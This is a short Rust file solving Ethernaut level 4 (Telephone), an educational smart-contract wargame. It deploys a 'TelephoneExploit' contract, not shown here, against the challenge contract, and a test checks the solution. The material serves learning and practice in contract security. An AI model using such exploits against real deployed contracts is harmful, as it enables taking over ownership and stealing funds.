use async_trait::async_trait;
use bindings::telephone_exploit::TelephoneExploit;
use ctf::*;

pub struct EthernautLevel4Solution;

#[async_trait]
impl Solution for EthernautLevel4Solution {
    type Level = EthernautLevel4;

    async fn solve(
        self,
        challenge: &Self::Level,
        offender: Actor,
    ) -> eyre::Result<()> {
        TelephoneExploit::deploy(
            offender.to_owned(),
            challenge.contract_address,
        )?
        .send()
        .await?;

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[ignore]
    #[tokio::test]
    async fn test() -> eyre::Result<()> {
        ctf::check_solution(EthernautLevel4Solution).await
    }
}
